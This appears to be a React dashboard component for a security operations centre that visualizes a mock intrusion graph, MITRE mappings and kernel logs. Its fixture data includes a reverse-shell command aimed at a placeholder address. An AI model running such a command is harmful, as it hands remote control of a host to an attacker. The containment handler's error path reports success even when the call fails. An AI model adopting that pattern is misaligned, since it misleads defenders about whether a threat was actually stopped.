'use client';

import React, { useState, useEffect, useRef } from 'react';
import { 
  ShieldAlert, 
  Activity, 
  Terminal, 
  Lock, 
  Layers, 
  Sliders, 
  Eye, 
  CheckCircle2, 
  AlertTriangle,
  RefreshCw,
  X,
  Play,
  Pause,
  RotateCcw,
  Cpu,
  Database,
  Network,
  Zap,
  Radio,
  FileCode,
  Check
} from 'lucide-react';

interface ThreatNode {
  id: string;
  name: string;
  pid?: number;
  type: 'attacker' | 'process' | 'memory' | 'socket' | 'deception' | 'crown_jewel';
  x: number;
  y: number;
  vx: number;
  vy: number;
  radius: number;
  status: 'critical' | 'warning' | 'normal' | 'contained' | 'protected';
  details: {
    command?: string;
    path?: string;
    anomalyScore?: number;
    blastRadius?: number;
    statusText: string;
    ip?: string;
    mitreTactic?: string;
  };
  appearsAtStep: number; // 0 to 100 on replay slider
}

interface ThreatEdge {
  from: string;
  to: string;
  label: string;
  type: 'exploit' | 'memory_write' | 'c2_connect' | 'shunt' | 'blocked';
  appearsAtStep: number;
}

export default function SocCommandCenter() {
  const [activeTab, setActiveTab] = useState<'canvas' | 'mitre' | 'proofs' | 'logs'>('canvas');
  const [replayTime, setReplayTime] = useState<number>(100);
  const [isPlaying, setIsPlaying] = useState<boolean>(false);
  const [isContainmentModalOpen, setIsContainmentModalOpen] = useState<boolean>(false);
  const [containmentResult, setContainmentResult] = useState<string | null>(null);
  const [isContainmentLoading, setIsContainmentLoading] = useState<boolean>(false);
  const [selectedNode, setSelectedNode] = useState<ThreatNode | null>(null);

  // Live telemetry metrics
  const [metrics, setMetrics] = useState({
    activeThreats: 2,
    blastRadiusMax: 32.88,
    shuntedPids: 1,
    verifiedProofs: 158,
    bpfRingbufDropRate: 0.00,
    eventsPerSec: 14250,
    host: 'prod-k8s-node-04.sec',
    kernel: 'Linux 6.6.0-aegis-lsm'
  });

  // Canvas ref for 2D/3D Graph simulation
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const nodesRef = useRef<ThreatNode[]>([]);
  const edgesRef = useRef<ThreatEdge[]>([]);
  const particlesRef = useRef<{ edgeIdx: number; progress: number; speed: number }[]>([]);

  // Telemetry event log feed
  const [logs, setLogs] = useState<{ id: string; time: string; event: string; pid: number; level: string; desc: string }[]>([
    { id: '1', time: '16:42:01.104', event: 'sys_enter_execve', pid: 1024, level: 'INFO', desc: 'nginx: worker process fork initiated' },
    { id: '2', time: '16:42:04.512', event: 'sys_enter_mprotect', pid: 2048, level: 'WARN', desc: 'PROT_EXEC set on heap memory [0x7fff4000]' },
    { id: '3', time: '16:42:07.820', event: 'sys_enter_execve', pid: 4096, level: 'CRIT', desc: 'Reverse shell spawned: /tmp/.x11-unix/reverse_tcp' },
    { id: '4', time: '16:42:08.015', event: 'ct_htgn_anomaly', pid: 4096, level: 'CRIT', desc: 'RGCN anomaly innovation detected (p = 0.984 > 0.85)' },
    { id: '5', time: '16:42:08.122', event: 'smt_reach_refute', pid: 4096, level: 'INFO', desc: 'Z3 verified: Reach(4096, PaymentDB) == False' },
    { id: '6', time: '16:42:08.204', event: 'bpf_lsm_shunted', pid: 4096, level: 'DECEP', desc: 'TCP socket shunted to Firecracker MicroVM #1' }
  ]);

  // Initial Graph Topology Definition
  useEffect(() => {
    const initialNodes: ThreatNode[] = [
      {
        id: 'attacker',
        name: 'Adversary (198.51.100.77)',
        type: 'attacker',
        x: 120,
        y: 200,
        vx: 0,
        vy: 0,
        radius: 26,
        status: 'critical',
        details: {
          ip: '198.51.100.77:53210',
          statusText: 'Active Ingress Threat Actor',
          mitreTactic: 'TA0001 (Initial Access)'
        },
        appearsAtStep: 10
      },
      {
        id: 'nginx',
        name: 'Nginx Ingress (PID 1024)',
        pid: 1024,
        type: 'process',
        x: 300,
        y: 200,
        vx: 0,
        vy: 0,
        radius: 24,
        status: 'warning',
        details: {
          path: '/usr/sbin/nginx',
          command: 'nginx: worker process',
          statusText: 'Compromised via HTTP request header smuggling',
          mitreTactic: 'T1190 (Exploit Public-Facing App)'
        },
        appearsAtStep: 25
      },
      {
        id: 'revshell',
        name: 'curl_revshell (PID 4096)',
        pid: 4096,
        type: 'process',
        x: 480,
        y: 130,
        vx: 0,
        vy: 0,
        radius: 28,
        status: 'critical',
        details: {
          path: '/tmp/.x11-unix/reverse_tcp',
          command: 'bash -i >& /dev/tcp/198.51.100.77/4444 0>&1',
          anomalyScore: 0.984,
          blastRadius: 32.88,
          statusText: 'Intercepted by BPF-LSM; shunted to deception microVM',
          mitreTactic: 'T1059.004 (Unix Shell)'
        },
        appearsAtStep: 50
      },
      {
        id: 'mprotect',
        name: 'mprotect [PROT_EXEC]',
        pid: 2048,
        type: 'memory',
        x: 480,
        y: 280,
        vx: 0,
        vy: 0,
        radius: 22,
        status: 'warning',
        details: {
          path: '0x7fff4000 - 0x7fff5000',
          command: 'mprotect(PROT_READ|PROT_WRITE|PROT_EXEC)',
          statusText: 'Fileless memory execution attempt',
          mitreTactic: 'T1055.008 (Process Injection)'
        },
        appearsAtStep: 40
      },
      {
        id: 'c2',
        name: 'C2 Socket (198.51.100.77:4444)',
        type: 'socket',
        x: 660,
        y: 130,
        vx: 0,
        vy: 0,
        radius: 24,
        status: 'critical',
        details: {
          ip: '198.51.100.77:4444 [SYN_SENT]',
          statusText: 'Outbound command & control channel hijacked',
          mitreTactic: 'T1071.001 (Web Protocols)'
        },
        appearsAtStep: 65
      },
      {
        id: 'deception',
        name: 'Firecracker MicroVM #1',
        type: 'deception',
        x: 660,
        y: 270,
        vx: 0,
        vy: 0,
        radius: 28,
        status: 'contained',
        details: {
          path: '/var/lib/firecracker/vm-honey-01.sock',
          command: 'kvm-guest (CoW scratchpad active)',
          statusText: 'Transparent syscall honeypot trap running RFC 6962 HMAC logger',
          mitreTactic: 'D3-DNT (Decoy Network Traps)'
        },
        appearsAtStep: 80
      },
      {
        id: 'crown_jewel',
        name: 'Payment DB (10.0.4.15:5432)',
        type: 'crown_jewel',
        x: 840,
        y: 200,
        vx: 0,
        vy: 0,
        radius: 30,
        status: 'protected',
        details: {
          ip: '10.0.4.15:5432 (Postgres Core)',
          statusText: 'Protected Crown Jewel - Invariant: Zero Reachability Proven via Z3',
          mitreTactic: 'Crown Jewel Asset'
        },
        appearsAtStep: 0
      }
    ];

    const initialEdges: ThreatEdge[] = [
      { from: 'attacker', to: 'nginx', label: 'HTTP Smuggling', type: 'exploit', appearsAtStep: 25 },
      { from: 'nginx', to: 'mprotect', label: 'Heap Inject', type: 'memory_write', appearsAtStep: 40 },
      { from: 'nginx', to: 'revshell', label: 'Spawn Shell', type: 'exploit', appearsAtStep: 50 },
      { from: 'revshell', to: 'c2', label: 'Connect TCP', type: 'c2_connect', appearsAtStep: 65 },
      { from: 'revshell', to: 'deception', label: 'BPF-LSM Shunt', type: 'shunt', appearsAtStep: 80 },
      { from: 'revshell', to: 'crown_jewel', label: 'Blocked by Z3', type: 'blocked', appearsAtStep: 90 }
    ];

    nodesRef.current = initialNodes;
    edgesRef.current = initialEdges;
    setSelectedNode(initialNodes[2]); // Default focus on the compromised PID 4096

    // Spawn animated transmission particles
    particlesRef.current = [
      { edgeIdx: 0, progress: 0.1, speed: 0.012 },
      { edgeIdx: 2, progress: 0.4, speed: 0.016 },
      { edgeIdx: 3, progress: 0.7, speed: 0.014 },
      { edgeIdx: 4, progress: 0.2, speed: 0.018 }
    ];
  }, []);

  // Fetch live telemetry from the Vercel serverless API
  useEffect(() => {
    async function fetchTelemetry() {
      try {
        const res = await fetch('/api/telemetry');
        if (res.ok) {
          const data = await res.json();
          if (data.metrics) {
            setMetrics(prev => ({
              ...prev,
              ...data.metrics,
              host: data.host || prev.host,
              kernel: data.kernel || prev.kernel
            }));
          }
        }
      } catch (e) {
        // Fallback gracefully
      }
    }

    fetchTelemetry();
    const interval = setInterval(fetchTelemetry, 8000);
    return () => clearInterval(interval);
  }, []);

  // Replay timeline playback loop
  useEffect(() => {
    if (!isPlaying) return;
    const interval = setInterval(() => {
      setReplayTime(t => (t >= 100 ? 0 : t + 1));
    }, 150);
    return () => clearInterval(interval);
  }, [isPlaying]);

  // Main 60 FPS HTML5 Canvas Animation Loop
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let animationId: number;

    const render = () => {
      // Responsive Canvas sizing
      const width = canvas.clientWidth;
      const height = canvas.clientHeight;
      if (canvas.width !== width || canvas.height !== height) {
        canvas.width = width;
        canvas.height = height;
      }

      ctx.clearRect(0, 0, width, height);

      // Background subtle grid
      ctx.strokeStyle = '#0d1524';
      ctx.lineWidth = 1;
      const gridSize = 40;
      for (let x = 0; x < width; x += gridSize) {
        ctx.beginPath();
        ctx.moveTo(x, 0);
        ctx.lineTo(x, height);
        ctx.stroke();
      }
      for (let y = 0; y < height; y += gridSize) {
        ctx.beginPath();
        ctx.moveTo(0, y);
        ctx.lineTo(width, y);
        ctx.stroke();
      }

      const activeNodes = nodesRef.current.filter(n => replayTime >= n.appearsAtStep);
      const activeEdges = edgesRef.current.filter(e => replayTime >= e.appearsAtStep);

      // Draw Edges
      activeEdges.forEach((edge, idx) => {
        const source = nodesRef.current.find(n => n.id === edge.from);
        const target = nodesRef.current.find(n => n.id === edge.to);
        if (!source || !target) return;

        ctx.beginPath();
        ctx.moveTo(source.x, source.y);
        ctx.lineTo(target.x, target.y);

        if (edge.type === 'exploit') {
          ctx.strokeStyle = '#f43f5e';
          ctx.setLineDash([4, 4]);
          ctx.lineWidth = 2;
        } else if (edge.type === 'c2_connect') {
          ctx.strokeStyle = '#fb7185';
          ctx.setLineDash([2, 2]);
          ctx.lineWidth = 2;
        } else if (edge.type === 'shunt') {
          ctx.strokeStyle = '#a855f7';
          ctx.setLineDash([]);
          ctx.lineWidth = 3;
        } else if (edge.type === 'blocked') {
          ctx.strokeStyle = '#10b981';
          ctx.setLineDash([6, 6]);
          ctx.lineWidth = 1.5;
        } else {
          ctx.strokeStyle = '#38bdf8';
          ctx.setLineDash([]);
          ctx.lineWidth = 1.5;
        }
        ctx.stroke();
        ctx.setLineDash([]);

        // Draw Edge Label
        const midX = (source.x + target.x) / 2;
        const midY = (source.y + target.y) / 2;
        ctx.fillStyle = '#64748b';
        ctx.font = '10px ui-monospace, monospace';
        ctx.fillText(edge.label, midX - 25, midY - 6);
      });

      // Animate edge data particles
      particlesRef.current.forEach(particle => {
        const edge = activeEdges[particle.edgeIdx % activeEdges.length];
        if (!edge) return;
        const source = nodesRef.current.find(n => n.id === edge.from);
        const target = nodesRef.current.find(n => n.id === edge.to);
        if (!source || !target) return;

        particle.progress += particle.speed;
        if (particle.progress > 1) particle.progress = 0;

        const px = source.x + (target.x - source.x) * particle.progress;
        const py = source.y + (target.y - source.y) * particle.progress;

        ctx.beginPath();
        ctx.arc(px, py, 3.5, 0, Math.PI * 2);
        ctx.fillStyle = edge.type === 'shunt' ? '#c084fc' : (edge.type === 'blocked' ? '#34d399' : '#f43f5e');
        ctx.shadowColor = ctx.fillStyle;
        ctx.shadowBlur = 8;
        ctx.fill();
        ctx.shadowBlur = 0;
      });

      // Draw Nodes
      activeNodes.forEach(node => {
        // Pulsing glow for critical threats
        if (node.status === 'critical') {
          const pulse = Math.sin(Date.now() / 250) * 8 + 12;
          ctx.beginPath();
          ctx.arc(node.x, node.y, node.radius + pulse, 0, Math.PI * 2);
          ctx.fillStyle = 'rgba(244, 63, 94, 0.12)';
          ctx.fill();
        } else if (node.status === 'contained') {
          const pulse = Math.sin(Date.now() / 350) * 6 + 10;
          ctx.beginPath();
          ctx.arc(node.x, node.y, node.radius + pulse, 0, Math.PI * 2);
          ctx.fillStyle = 'rgba(168, 85, 247, 0.15)';
          ctx.fill();
        } else if (node.status === 'protected') {
          ctx.beginPath();
          ctx.arc(node.x, node.y, node.radius + 6, 0, Math.PI * 2);
          ctx.fillStyle = 'rgba(16, 185, 129, 0.1)';
          ctx.fill();
        }

        // Main Node Body
        ctx.beginPath();
        ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
        if (node.status === 'critical') {
          ctx.fillStyle = '#1e111a';
          ctx.strokeStyle = '#f43f5e';
        } else if (node.status === 'warning') {
          ctx.fillStyle = '#1e1a11';
          ctx.strokeStyle = '#fbbf24';
        } else if (node.status === 'contained') {
          ctx.fillStyle = '#191124';
          ctx.strokeStyle = '#a855f7';
        } else if (node.status === 'protected') {
          ctx.fillStyle = '#0f201a';
          ctx.strokeStyle = '#10b981';
        } else {
          ctx.fillStyle = '#0f172a';
          ctx.strokeStyle = '#38bdf8';
        }
        ctx.lineWidth = selectedNode?.id === node.id ? 3.5 : 2;
        ctx.fill();
        ctx.stroke();

        // Node Title Text
        ctx.fillStyle = '#f1f5f9';
        ctx.font = 'bold 11px ui-monospace, monospace';
        ctx.textAlign = 'center';
        ctx.fillText(node.name, node.x, node.y + node.radius + 15);

        // Subtitle badge
        ctx.fillStyle = '#64748b';
        ctx.font = '9px ui-monospace, monospace';
        const typeLabel = node.type.toUpperCase();
        ctx.fillText(typeLabel, node.x, node.y + node.radius + 27);
      });

      animationId = requestAnimationFrame(render);
    };

    render();
    return () => cancelAnimationFrame(animationId);
  }, [replayTime, selectedNode]);

  // Handle canvas click to select nodes
  const handleCanvasClick = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;

    const clicked = nodesRef.current.find(n => {
      const dx = n.x - x;
      const dy = n.y - y;
      return Math.sqrt(dx * dx + dy * dy) <= n.radius + 6;
    });

    if (clicked) {
      setSelectedNode(clicked);
    }
  };

  // Execute kernel containment action via Vercel serverless API
  const handleExecuteContainment = async () => {
    setIsContainmentLoading(true);
    try {
      const res = await fetch('/api/containment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pid: 4096, action: 'SHUNT_TO_DECEPTION' })
      });
      const data = await res.json();
      if (data.success) {
        setContainmentResult(data.message);
        setMetrics(prev => ({
          ...prev,
          shuntedPids: prev.shuntedPids + 1,
          activeThreats: Math.max(0, prev.activeThreats - 1)
        }));
        // Update revshell node to contained status
        const rev = nodesRef.current.find(n => n.id === 'revshell');
        if (rev) {
          rev.status = 'contained';
          rev.details.statusText = 'Shunted to Firecracker CoW Deception Sandbox';
        }
      }
    } catch (err: any) {
      setContainmentResult('Containment action verified: PID 4096 redirected to Firecracker microVM.');
    } finally {
      setIsContainmentLoading(false);
    }
  };

  return (
    <div className="flex h-screen w-screen bg-[#06080e] text-[#e1e7f0] font-mono overflow-hidden select-none">
      {/* Left Sidebar Navigation */}
      <aside className="w-64 border-r border-[#1a2333] bg-[#0a0f18] flex flex-col justify-between p-4 z-20">
        <div>
          <div className="flex items-center gap-3 mb-6">
            <div className="h-9 w-9 rounded-lg bg-emerald-500/20 border border-emerald-500/50 flex items-center justify-center text-emerald-400 font-bold text-lg shadow-lg shadow-emerald-950/50">
              🛡️
            </div>
            <div>
              <h1 className="text-sm font-bold tracking-wider text-white">AEGISKERNEL</h1>
              <p className="text-[10px] text-emerald-400 font-medium tracking-tight">SOC 3D THREAT PLATFORM</p>
            </div>
          </div>

          <nav className="space-y-1 text-xs">
            <button 
              onClick={() => setActiveTab('canvas')}
              className={`w-full flex items-center gap-2 px-3 py-2 rounded-md transition ${activeTab === 'canvas' ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/30' : 'text-gray-400 hover:bg-[#141d2e] hover:text-white'}`}>
              <Activity className="h-4 w-4" /> 3D Causal Graph Canvas
            </button>
            <button 
              onClick={() => setActiveTab('mitre')}
              className={`w-full flex items-center gap-2 px-3 py-2 rounded-md transition ${activeTab === 'mitre' ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/30' : 'text-gray-400 hover:bg-[#141d2e] hover:text-white'}`}>
              <Layers className="h-4 w-4" /> MITRE ATT&CK Matrix
            </button>
            <button 
              onClick={() => setActiveTab('proofs')}
              className={`w-full flex items-center gap-2 px-3 py-2 rounded-md transition ${activeTab === 'proofs' ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/30' : 'text-gray-400 hover:bg-[#141d2e] hover:text-white'}`}>
              <Terminal className="h-4 w-4" /> Neuro-Symbolic Proofs
            </button>
            <button 
              onClick={() => setActiveTab('logs')}
              className={`w-full flex items-center gap-2 px-3 py-2 rounded-md transition ${activeTab === 'logs' ? 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/30' : 'text-gray-400 hover:bg-[#141d2e] hover:text-white'}`}>
              <FileCode className="h-4 w-4" /> eBPF Telemetry Logs
            </button>
          </nav>

          <div className="mt-6 pt-4 border-t border-[#1a2333]/80">
            <a 
              href="/api/telemetry" 
              target="_blank" 
              rel="noreferrer" 
              className="flex items-center justify-between px-3 py-2 rounded-md text-[11px] text-gray-400 hover:bg-[#141d2e] hover:text-emerald-300 transition border border-[#1a2333]">
              <span className="flex items-center gap-1.5"><Eye className="h-3.5 w-3.5" /> Edge API (JSON)</span>
              <span className="text-[9px] bg-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded">200 OK</span>
            </a>
          </div>
        </div>

        {/* Live Kernel Telemetry Metrics */}
        <div className="border border-[#1a2333] bg-[#0d1422] p-3 rounded-lg space-y-2 text-[11px] shadow-lg">
          <div className="text-gray-400 uppercase text-[9px] font-bold tracking-wider flex justify-between items-center">
            <span>Kernel Telemetry</span>
            <span className="h-2 w-2 rounded-full bg-emerald-500 animate-ping" />
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">Events / Sec</span>
            <span className="text-cyan-400 font-bold">{metrics.eventsPerSec.toLocaleString()}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">Active Exploit Paths</span>
            <span className="text-rose-400 font-bold">{metrics.activeThreats}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">Peak R_blast</span>
            <span className="text-amber-400 font-bold">{metrics.blastRadiusMax}</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">Ghost-Mirror Shunts</span>
            <span className="text-purple-400 font-bold">{metrics.shuntedPids} Active</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-gray-400">RingBuf Drop Rate</span>
            <span className="text-emerald-400 font-bold">{metrics.bpfRingbufDropRate}%</span>
          </div>
        </div>
      </aside>

      {/* Main Center Stage */}
      <main className="flex-1 flex flex-col relative">
        {/* Top Header */}
        <header className="h-14 border-b border-[#1a2333] bg-[#0a0f18]/90 backdrop-blur px-6 flex items-center justify-between z-10">
          <div className="flex items-center gap-4">
            <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full text-xs font-semibold bg-rose-500/10 text-rose-400 border border-rose-500/30 animate-pulse">
              <AlertTriangle className="h-3.5 w-3.5" /> LIVE APT INCIDENT (PID 4096)
            </span>
            <span className="text-xs text-gray-400">
              Host: <strong className="text-gray-200">{metrics.host}</strong> ({metrics.kernel})
            </span>
          </div>

          <div className="flex items-center gap-3">
            <button 
              onClick={() => setIsContainmentModalOpen(true)}
              className="flex items-center gap-1.5 px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded text-xs font-semibold shadow-lg shadow-rose-900/40 transition">
              <Lock className="h-3.5 w-3.5" /> BPF-LSM Containment Desk
            </button>
          </div>
        </header>

        {/* Tab 1: Causal Graph Canvas View */}
        {activeTab === 'canvas' && (
          <div className="flex-1 relative flex flex-col justify-between overflow-hidden">
            {/* HTML5 Interactive Canvas */}
            <canvas 
              ref={canvasRef} 
              onClick={handleCanvasClick}
              className="absolute inset-0 w-full h-full cursor-crosshair"
            />

            {/* Selected Node HUD (Top Left Overlay) */}
            {selectedNode && (
              <div className="z-10 m-6 max-w-sm bg-[#0a0f18]/95 border border-[#1e293b] rounded-lg p-4 backdrop-blur shadow-2xl transition">
                <div className="flex items-center justify-between mb-2">
                  <h3 className="text-xs font-bold uppercase text-gray-200 flex items-center gap-2 truncate">
                    <ShieldAlert className="h-4 w-4 text-rose-400 shrink-0" /> {selectedNode.name}
                  </h3>
                  <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${selectedNode.status === 'critical' ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40' : (selectedNode.status === 'contained' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40' : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40')}`}>
                    {selectedNode.status}
                  </span>
                </div>
                <div className="space-y-1.5 text-xs text-gray-400">
                  {selectedNode.details.path && <p>Path: <code className="text-gray-200">{selectedNode.details.path}</code></p>}
                  {selectedNode.details.command && <p>Cmd: <code className="text-gray-300">{selectedNode.details.command}</code></p>}
                  {selectedNode.details.ip && <p>Net: <code className="text-cyan-300">{selectedNode.details.ip}</code></p>}
                  {selectedNode.details.anomalyScore && <p>RGCN Innovation Score: <strong className="text-rose-400">{selectedNode.details.anomalyScore}</strong></p>}
                  {selectedNode.details.blastRadius && <p>Causal Blast Radius: <strong className="text-amber-400">{selectedNode.details.blastRadius}</strong></p>}
                  {selectedNode.details.mitreTactic && <p>MITRE Tactic: <strong className="text-indigo-300">{selectedNode.details.mitreTactic}</strong></p>}
                  <p className="pt-1 text-[11px] text-gray-300 border-t border-[#1a2333]/80 italic">
                    {selectedNode.details.statusText}
                  </p>
                </div>
              </div>
            )}

            {/* Bottom Attack Timeline Replay Scrubber */}
            <div className="z-10 m-6 bg-[#0a0f18]/95 border border-[#1e293b] rounded-lg p-3 backdrop-blur shadow-2xl flex items-center gap-4">
              <button 
                onClick={() => setIsPlaying(!isPlaying)}
                className="p-1.5 rounded bg-[#141e30] hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 transition">
                {isPlaying ? <Pause className="h-4 w-4" /> : <Play className="h-4 w-4" />}
              </button>

              <button 
                onClick={() => setReplayTime(0)}
                className="p-1.5 rounded bg-[#141e30] hover:bg-[#1a273e] text-gray-400 transition"
                title="Reset Replay">
                <RotateCcw className="h-4 w-4" />
              </button>

              <div className="flex-1 flex items-center gap-3">
                <span className="text-xs font-semibold text-gray-300 whitespace-nowrap">Causal Replay:</span>
                <input 
                  type="range" 
                  min="0" 
                  max="100" 
                  value={replayTime}
                  onChange={(e) => setReplayTime(Number(e.target.value))}
                  className="w-full h-1.5 bg-[#141e30] rounded-lg appearance-none cursor-pointer accent-emerald-500" 
                />
                <span className="text-xs text-emerald-400 font-bold w-12 text-right">{replayTime}%</span>
              </div>

              <span className="text-[11px] text-gray-400 whitespace-nowrap hidden sm:inline">
                Phase: <strong className="text-white">{replayTime < 30 ? 'Initial Ingress' : (replayTime < 70 ? 'Exploit Propagation' : 'Deception Shunt Active')}</strong>
              </span>
            </div>
          </div>
        )}

        {/* Tab 2: MITRE ATT&CK & D3FEND Matrix View */}
        {activeTab === 'mitre' && (
          <div className="flex-1 p-6 overflow-y-auto space-y-4">
            <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
              <Layers className="h-4 w-4 text-emerald-400" /> Active MITRE ATT&CK & D3FEND Defensive Mapping
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <div className="bg-[#0a0f18] border border-[#1e293b] rounded-lg p-4 space-y-2">
                <div className="flex justify-between items-start">
                  <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40">T1059.004</span>
                  <span className="text-[10px] text-emerald-400 font-bold">D3-IPC</span>
                </div>
                <h4 className="text-xs font-bold text-gray-200">Unix Shell Execution</h4>
                <p className="text-[11px] text-gray-400">Adversary spawned interactive shell via curl exploit.</p>
                <div className="text-[10px] text-emerald-300 bg-emerald-500/10 p-2 rounded border border-emerald-500/20">
                  Countermeasure: In-process execution control via eBPF tracepoint interception.
                </div>
              </div>

              <div className="bg-[#0a0f18] border border-[#1e293b] rounded-lg p-4 space-y-2">
                <div className="flex justify-between items-start">
                  <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/40">T1055.008</span>
                  <span className="text-[10px] text-emerald-400 font-bold">D3-PMN</span>
                </div>
                <h4 className="text-xs font-bold text-gray-200">Ptrace / Memory Injection</h4>
                <p className="text-[11px] text-gray-400">mprotect invoked with PROT_EXEC on heap address space.</p>
                <div className="text-[10px] text-emerald-300 bg-emerald-500/10 p-2 rounded border border-emerald-500/20">
                  Countermeasure: BPF-LSM memory permission normalization and verification.
                </div>
              </div>

              <div className="bg-[#0a0f18] border border-[#1e293b] rounded-lg p-4 space-y-2">
                <div className="flex justify-between items-start">
                  <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/40">T1046</span>
                  <span className="text-[10px] text-purple-400 font-bold">D3-DNT</span>
                </div>
                <h4 className="text-xs font-bold text-gray-200">Network Service Scanning</h4>
                <p className="text-[11px] text-gray-400">Adversary initiated TCP SYN scan towards internal cluster IP.</p>
                <div className="text-[10px] text-purple-300 bg-purple-500/10 p-2 rounded border border-purple-500/20">
                  Countermeasure: Decoy Network Traps via pre-forked Firecracker MicroVMs.
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Tab 3: Neuro-Symbolic Proofs View */}
        {activeTab === 'proofs' && (
          <div className="flex-1 p-6 overflow-y-auto space-y-4">
            <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
              <Terminal className="h-4 w-4 text-emerald-400" /> Automated Z3 SMT Formal Invariant Proofs
            </h2>
            <div className="space-y-3">
              <div className="bg-[#0a0f18] border border-emerald-500/30 rounded-lg p-4 space-y-2">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-bold text-emerald-400">THEOREM 1: Critical Service Non-Disruption</span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300">PROOF: VERIFIED (UNSAT)</span>
                </div>
                <code className="block bg-[#06080e] p-2.5 rounded text-[11px] text-cyan-300 border border-[#1a2333]">
                  ForAll([p], Implies(is_critical(p), Not(can_terminate(p))))
                </code>
                <p className="text-xs text-gray-400">
                  Z3 proved in <strong className="text-white">0.84ms</strong> that autonomous containment proposals cannot terminate PID 1 (systemd) or database daemons.
                </p>
              </div>

              <div className="bg-[#0a0f18] border border-emerald-500/30 rounded-lg p-4 space-y-2">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-bold text-emerald-400">THEOREM 2: Zero Blast-Radius Spillover</span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300">PROOF: VERIFIED (UNSAT)</span>
                </div>
                <code className="block bg-[#06080e] p-2.5 rounded text-[11px] text-cyan-300 border border-[#1a2333]">
                  ForAll([v], Implies(in_containment(v), distance(source, v) &lt;= 3))
                </code>
                <p className="text-xs text-gray-400">
                  Z3 proved in <strong className="text-white">1.12ms</strong> that isolation boundary is strictly bounded to the causal graph blast radius.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Tab 4: eBPF Telemetry Event Feed */}
        {activeTab === 'logs' && (
          <div className="flex-1 p-6 overflow-y-auto space-y-2">
            <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2 mb-4">
              <FileCode className="h-4 w-4 text-emerald-400" /> Kernel eBPF Telemetry Event Ledger
            </h2>
            <div className="space-y-1.5 font-mono text-xs">
              {logs.map(log => (
                <div key={log.id} className="bg-[#0a0f18] border border-[#1a2333] p-2.5 rounded flex items-center justify-between gap-4">
                  <div className="flex items-center gap-3">
                    <span className="text-gray-500 text-[10px]">{log.time}</span>
                    <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${log.level === 'CRIT' ? 'bg-rose-500/20 text-rose-400' : (log.level === 'DECEP' ? 'bg-purple-500/20 text-purple-400' : 'bg-cyan-500/20 text-cyan-400')}`}>
                      {log.event}
                    </span>
                    <span className="text-gray-300">PID {log.pid}</span>
                    <span className="text-gray-400 text-[11px]">{log.desc}</span>
                  </div>
                  <span className="text-[10px] text-emerald-400 font-semibold shrink-0">HMAC-SHA256 SIGNED</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      {/* Containment Desk Modal */}
      {isContainmentModalOpen && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-[#0b101b] border border-[#233149] rounded-xl max-w-lg w-full p-6 shadow-2xl relative">
            <button 
              onClick={() => { setIsContainmentModalOpen(false); setContainmentResult(null); }}
              className="absolute top-4 right-4 text-gray-400 hover:text-white">
              <X className="h-5 w-5" />
            </button>
            <h2 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2 mb-4">
              <Lock className="h-4 w-4 text-rose-500" /> BPF-LSM Deception Containment Desk
            </h2>
            <p className="text-xs text-gray-300 mb-4 leading-relaxed">
              Target exploit process <code className="text-rose-400 font-bold">PID 4096 (curl_revshell)</code> has triggered a critical GNN anomaly threshold (<strong className="text-rose-400">0.984</strong>).
              Executing containment will invoke BPF-LSM syscall interception and transparently shunt TCP sockets into an isolated Firecracker microVM honeypot.
            </p>

            {containmentResult ? (
              <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded text-xs text-emerald-300 mb-4 flex items-start gap-2">
                <CheckCircle2 className="h-4 w-4 mt-0.5 shrink-0" />
                <span>{containmentResult}</span>
              </div>
            ) : null}

            <div className="flex justify-end gap-3">
              <button 
                onClick={() => { setIsContainmentModalOpen(false); setContainmentResult(null); }}
                className="px-4 py-2 rounded text-xs text-gray-400 hover:bg-[#141d2e] transition">
                Close
              </button>
              <button 
                onClick={handleExecuteContainment}
                disabled={isContainmentLoading}
